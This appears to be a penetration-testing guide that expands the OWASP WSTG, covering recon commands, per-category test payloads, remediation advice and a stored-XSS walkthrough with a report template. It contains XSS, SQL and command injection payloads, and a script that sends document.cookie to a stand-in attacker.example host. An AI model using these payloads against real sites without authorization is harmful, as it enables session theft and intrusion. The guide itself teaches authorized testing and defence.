

![download](https://github.com/user-attachments/assets/6de18cab-6560-4aa7-be07-efacef984deb)

The **WSTG** is a community-maintained, practical manual for testing web applications. It organizes tests into categories, gives concrete test cases, and is designed to be used during real assessments. This document expands WSTG with detailed actions, examples, tools, and reporting templates.

---

## How to use this guide

1. Read the phases and pick relevant WSTG sections for your engagement scope.
2. Use the checklists and test cases during manual testing and to validate scanner output.
3. Capture all evidence (requests/responses, screenshots, logs) and use the reporting template.
4. Prioritize by business impact and likelihood (use OWASP risk rating or CVSS).
5. Always follow Rules of Engagement (RoE).

---

## WSTG: Main categories (high-level)

WSTG splits testing into logical groups. Below each group you’ll find **detailed test cases**, **how to test**, **payloads/commands**, **expected results**, and **remediation**.

1. **Information Gathering (WSTG-INFO)**
2. **Configuration & Deployment Management (WSTG-CONF)**
3. **Identity Management / Authentication (WSTG-AUTH)**
4. **Session Management (WSTG-SESS)**
5. **Access Control (WSTG-AUTHZ)**
6. **Input Validation (WSTG-INPUT)**
7. **Command Injection & OS (WSTG-INJ)**
8. **Data Protection (WSTG-CRYPTO & DATA)**
9. **Business Logic (WSTG-BUSLOGIC)**
10. **Client-side Testing (WSTG-CLIENT)**
11. **API Testing (WSTG-API)**
12. **File Upload & Processing (WSTG-FILE)**
13. **Error Handling & Logging (WSTG-ERROR/LOG)**
14. **Third-party Components & Supply Chain (WSTG-COMP)**
15. **Misc advanced: Race conditions, SSRF, Deserialization (WSTG-ADV)**

---

## 1. Information Gathering (WSTG-INFO)

**Goal:** Build the attack surface: domains, subdomains, apps, endpoints, tech stack, public data.

### Tests & techniques

* **Subdomain enumeration**: `subfinder -d example.com -o subs.txt` ; `amass enum -d example.com -o amass.txt`
* **Certificate transparency**: `crt.sh` searches for cert-subdomains.
* **Archive & wayback**: `waybackurls example.com | tee wayback.txt` → find forgotten endpoints.
* **Robots.txt**: check `https://example.com/robots.txt` for disallowed paths.
* **Search engines / Google Dorking**: `site:example.com ext:sql OR ext:env OR ext:bak`
* **JS analysis**: download JS files & grep (`grep -Eo "(https?://[^\"]+)" *.js`) and use `linkfinder`.

### Deliverables

* `discovery.json` with subdomain list, endpoints, login pages, upload points, JS endpoints.

---

## 2. Configuration & Deployment Management (WSTG-CONF)

**Goal:** Find misconfigurations, default credentials, exposed dashboards, insecure headers.

### Tests

* **Default pages**: try `/server-status`, `/phpmyadmin`, `/admin`.
* **Headers**: `curl -I https://app.example.com` → inspect `Server`, `X-Powered-By`, CSP, HSTS.
* **Open S3 / storage buckets**: check for public buckets.
* **TLS config**: use SSL Labs or `openssl s_client -connect host:443` to verify ciphers.

### Remediation highlights

* Turn off verbose server banners; set `Strict-Transport-Security`, `X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY`, and CSP.
* Remove default/admin pages and change default creds.

---

## 3. Identity Management / Authentication (WSTG-AUTH)

**Goal:** Test login flows, account creation, reset flows, MFA, credential storage.

### Test cases & how to test

* **Password policy**: create accounts using weak passwords; check acceptance.
* **Username enumeration**: submit login/forgot-password for valid/invalid usernames and observe differences (timing, message).
* **Brute force protections**: test login rate limit with small bursts (only with permission).
* **Password reset tokens**: capture reset email link token; test token length, entropy, expiry, reuse.
* **Multi-factor**: test fallback mechanisms (SMS/email) for bypass.

### Tools & commands

```bash
# Basic login attempt via curl
curl -s -X POST 'https://app.example.com/login' -d 'username=alice&password=test123'
```

### Remediation

* Enforce strong passwords, MFA, rate-limiting, and unpredictable reset tokens; store passwords hashed (bcrypt/Argon2).

---

## 4. Session Management (WSTG-SESS)

**Goal:** Verify cookie flags, session fixation, rotation, invalidation, and token entropy.

### Tests

* **Cookie flags**: `Set-Cookie` must include `HttpOnly; Secure; SameSite=Strict` where appropriate.
* **Session rotation**: session ID should change on login/privilege change.
* **Logout invalidation**: cookies should be invalidated server-side on logout.
* **Long-lived tokens**: check expiry policies.

### Tools

* Burp → **Sequencer** to check token randomness; **Repeater** to test fixation.

### Remediation

* Rotate session IDs, set cookie flags, short expiry for sensitive roles, protect tokens in storage (avoid localStorage for auth tokens).

---

## 5. Access Control / Authorization (WSTG-AUTHZ)

**Goal:** Test horizontal & vertical access control, function-level checks, IDOR.

### Tests & payloads

* **IDOR**: change resource IDs: `GET /invoices/100` → `GET /invoices/101`.
* **Function-level bypass**: call `POST /admin/update` as normal user.
* **Role tampering**: modify role parameters in requests.

### Remediation

* Implement server-side authorization checks for every request, deny-by-default, centralize ACLs, test all possible roles.

---

## 6. Input Validation (WSTG-INPUT)

**Goal:** Find XSS, SQLi, NoSQLi, OS injection, XPath injection, command injection.

### Typical payloads (non-destructive)

* **XSS**: `<script>alert('XSS')</script>` or attribute context `" onmouseover="alert(1)`
* **SQLi**: `1' OR '1'='1` or time-based: `1' OR SLEEP(5)-- -` (only if allowed)
* **Command injection**: `; ls -la /` (DON’T run destructive commands without explicit permission)
* **NoSQLi (Mongo)**: `{"$ne": null}` or `username[$ne]=` tests

### Testing methods

* Manual payload tuning in **Burp Repeater**.
* Use `sqlmap` carefully: `sqlmap -u "https://app.example.com/product?id=1" --batch --level=2 --risk=1`.

### Remediation

* Use parameterized queries, strict input validation (whitelist), and output encoding.

---

## 7. Data Protection & Crypto (WSTG-CRYPTO)

**Goal:** Ensure data-in-transit and at-rest uses proper cryptography and secrets handling.

### Tests

* Check TLS; verify `HSTS`.
* Inspect storage for plaintext secrets or keys in source code.
* Verify password hashing algorithm (bcrypt/Argon2).

### Remediation

* Use TLS 1.2/1.3, strong ciphers, key rotation, vaults for secrets, and modern password hashing.

---

## 8. Business Logic Testing (WSTG-BUSLOGIC)

**Goal:** Find logic flaws not covered by generic scans: refunds, transfers, order processes.

### Tests

* **Price tampering**: intercept client-side price and change before checkout.
* **Duplicate order exploit**: replay purchase flow to charge multiple times or skip payment.
* **Privilege escalation via workflows**: reward/referral abuse.

### Remediation

* Validate critical business values server-side, use atomic transactions, implement server-side checks and monitoring.

---

## 9. Client-side Testing (WSTG-CLIENT)

**Goal:** DOM XSS, insecure client storage, exposed endpoints & keys.

### Tests

* Analyze JS for `innerHTML`, `document.write`, sinks.
* Check `localStorage`/`sessionStorage` for tokens.
* Scan for exposed API keys in JS files.

### Remediation

* Avoid storing secrets in client storage; use `HttpOnly` cookies; sanitize inputs before injecting into DOM; CSP.

---

## 10. API Security (WSTG-API)

**Goal:** Test REST/GraphQL endpoints for auth, rate-limiting, injection, and excessive data exposure.

### Tests

* **Broken object-level authorization** on APIs: modify `user_id` fields in JSON payloads.
* **Excessive data exposure**: call `/users` and check if PII is returned for all users.
* **Rate limiting**: stress auth endpoint to check brute-force protection (with permission).

### Tools

* Postman, `httpie`, Burp, OWASP ZAP API testing.

### Remediation

* Apply authz checks per API, use JSON schema validation, implement rate-limiting and pagination.

---

## 11. File Upload & Processing (WSTG-FILE)

**Goal:** Test upload functionality for unsafe types, execution, and storage issues.

### Tests

* Upload files with embedded scripts or polyglots (e.g., `image.jpg` containing PHP).
* Check server stores files under webroot: `GET /uploads/<file>` → executable?
* Test content-type mismatch: `Content-Type: image/jpeg` but file is `.php`.

### Remediation

* Store uploads outside webroot, re-encode images server-side, validate magic bytes, rename files, use S3 with private ACL, scan for malware.

---

## 12. Error Handling & Logging (WSTG-ERROR/LOG)

**Goal:** Find verbose errors leaking stack traces, SQL errors, and missing logging for security events.

### Tests

* Trigger server errors to observe stack traces.
* Verify logs capture auth failures, privilege changes, and file uploads.

### Remediation

* Hide stack traces in production, sanitize errors, centralize logs, alert on suspicious events.

---

## 13. Third-party Components & Supply Chain (WSTG-COMP)

**Goal:** Detect vulnerable libraries, insecure pipeline, and compromised dependencies.

### Tests

* Check `package.json`, `requirements.txt`, `composer.json` for outdated packages.
* SCA (Software Composition Analysis): Snyk, Dependabot, OWASP Dependency-Check.

### Remediation

* Patch dependencies, pin versions, employ SBOM, secure CI/CD credentials, sign artifacts.

---

## 14. Advanced: Race Conditions, Deserialization, SSRF (WSTG-ADV)

**Goal:** Test concurrency, object deserialization, and server-side request forgery.

### Tests

* **Race**: issue parallel requests to decrement inventory. Use Python `concurrent.futures` script.
* **Deserialization**: find serialized payload endpoints (cookies, tokens) and test tampering.
* **SSRF**: test URL-fetch endpoints with callback listener (be careful with RoE; do not probe internal resources without permission).

### Remediation

* Use transactional updates for critical operations, avoid unsafe deserialization, validate and whitelist outbound URLs, restrict outbound network access.

---

## Mapping WSTG → OWASP Top 10 (quick)

* **Authentication/Session/Input/Access Control** → maps to **2021 A01, A07, A03**.
* **Data Protection & Crypto** → **A02 (Cryptographic Failures)**.
* **Components & Supply Chain** → **A06 / A08**.
* **SSRF, Deserialization** → **A10 / A08**.
* **Logging & Monitoring** → **A09**.

---

## Test planning & execution tips

* **Start passive**: discovery & non-intrusive checks.
* **Prioritize** by business impact (admin, payment, PII endpoints first).
* **Automate early**: run scanners with tuned scope; then triage & validate findings manually.
* **Manual deep dive**: fuzzing, logic testing, JS analysis, chained exploit attempts.
* **Evidence**: capture raw requests/responses, Burp project file, screenshots, server logs (if available).

---

## Risk rating & reporting

* Use **OWASP Risk Rating** or **CVSSv3**. For most pentests, include a short business-context paragraph for each finding.
* **Report structure (per finding)**:

  * Title
  * Severity (CVSS / OWASP risk)
  * Affected URLs & parameters
  * Technical description (root cause)
  * Reproduction steps (copy-pasteable)
  * Evidence (screenshots, requests)
  * Impact (technical & business)
  * Remediation (concrete code/config)
  * References (WSTG pages, OWASP cheat sheets)

---

## Automation & CI integration

* Integrate vulnerability scanning and SCA in CI: DAST nightly, SCA on PRs.
* Add WSTG checklists to test plans in ticketing systems.
* Use `nuclei` templates for periodic quick checks.

---

## WSTG Checklist (practical, copy-pasteable)

Use this minimal checklist per engagement (mark ✓/✗):

* [ ] RoE & scope approved
* [ ] Recon complete (subdomains, endpoints)
* [ ] Auth flows identified & tested
* [ ] Session tokens & cookie flags checked
* [ ] Input validation tested (XSS, SQLi, Command inj.)
* [ ] APIs tested for authz & excessive data exposure
* [ ] File uploads validated and tested
* [ ] Sensitive data protection verified (TLS, at-rest encryption)
* [ ] Components & dependencies scanned
* [ ] Error handling & logs checked
* [ ] Business logic tests executed
* [ ] Advanced tests (race, SSRF, deserialization) performed if in scope
* [ ] Report drafted with prioritized remediation & retest plan

---

## Example — Complete Stored XSS walkthrough (practical PoC)

> Real, actionable example you can follow in a lab. This is **non-destructive** and safe when done with permission. It demonstrates WSTG-INPUT + WSTG-CLIENT checks, PoC capture, and remediation.

### Scenario

Target: `https://app.example.com`
Vulnerable endpoint: comment form on `https://app.example.com/post/123` (POST `/post/123/comment`, parameter `comment`)

### Objective

Demonstrate stored XSS: attacker stores JS in comment, it executes in victim/admin browser.

### Tools

* Burp Suite (Proxy, Repeater, HTTP history)
* A controlled callback domain (optional): `https://attacker.example/collect` (for safe, consented PoC)
* Browser with test user accounts

### Steps (copy-pasteable)

1. **Intercept request while submitting comment**

   * Enable proxy, login as test user, submit a normal comment.
   * In Burp → Proxy → HTTP history find the `POST /post/123/comment` request.

2. **Send the request to Repeater**

   * Right-click request → **Send to Repeater**.

3. **Craft a harmless test payload**

   ```http
   POST /post/123/comment HTTP/1.1
   Host: app.example.com
   Content-Type: application/x-www-form-urlencoded
   Cookie: session=...

   comment=<script>alert('XSS_TEST')</script>
   ```

   * Paste into Repeater, click **Send**. Confirm server returns 200.

4. **Verify rendering as another user**

   * Open an incognito window (or login as another user/admin if permitted) and visit `https://app.example.com/post/123`.
   * If the alert shows, stored XSS is confirmed.

5. **(Optional safer PoC using callback)**

   * Use non-invasive callback to your controlled server instead of alert:

   ```html
   <script>new Image().src='https://attacker.example/collect?c='+encodeURIComponent(document.cookie)</script>
   ```

   * Submit and check your `attacker.example` logs for incoming GET with cookie value (ONLY if authorized and allowed by RoE; never capture real PII).

6. **Capture evidence**

   * Save Burp request/response (Right click → Save item) → `burp_xss_post.txt`.
   * Take screenshot of the alert in the victim browser and of the rendered HTML showing the injected `<script>`.
   * If used, save callback server logs (timestamp + request line).

### Sample Report Entry (copy-pasteable)

```
Title: Stored Cross-Site Scripting (XSS) in /post/123
Severity: High
CVSS v3 Base Score: 6.1 (example)
Affected: https://app.example.com/post/123
Description:
  The comment submission functionality stores unfiltered user input and renders it without proper output encoding. This allows an attacker to inject JavaScript that executes in other users' browsers (stored XSS).
Reproduction steps:
  1. Login as internal user (test account).
  2. POST /post/123/comment with body:
     comment=<script>alert('XSS_TEST')</script>
  3. Visit https://app.example.com/post/123 as another user — the alert appears.
Evidence:
  - Screenshot: evidence/xss_alert.png
  - Burp request/response: evidence/burp_xss_post.txt
Impact:
  An attacker can execute arbitrary JS in victim browsers, leading to session theft, CSRF, command execution within the browser context, or targeted phishing.
Remediation:
  - Context-aware output encoding: e.g., in Python/Jinja2 use `{{ comment | e }}`.
  - Sanitize HTML inputs: use a library like DOMPurify or server-side sanitizer; whitelist tags/attributes if HTML is required.
  - Implement CSP header: `Content-Security-Policy: default-src 'self'; script-src 'self';`
  - Additional: consider restricting posting rights and moderate user-generated content.
References:
  - OWASP XSS Prevention Cheat Sheet
```

### Example remediation snippet (Jinja2 / Python)

```jinja
{# In Jinja2 template #}
<div class="comment-body">{{ comment | e }}</div>
```

### CSP example (server header)

```
Content-Security-Policy: default-src 'self'; script-src 'self'
```

### Notes & safe-practices

* Use synthetic accounts, do not exfiltrate real user cookies or PII in PoCs unless explicitly allowed.
* For high-impact vulnerabilities found in production, notify the client immediately through agreed channels before public disclosure.

---

## Final tips & learning path

* **Use WSTG as your daily checklist** — map each WSTG test case to your scanner/manual tests.
* **Practice on labs**: Juice Shop, PortSwigger Academy, DVWA. Recreate both vulnerable and fixed scenarios to learn prevention.
* **Automate where possible**: add basic DAST and SCA to CI, but always manually validate high-risk findings.
* **Document everything**: the best pentesters write clear reproduction steps and remediation code — that’s what gets fixes done.

---
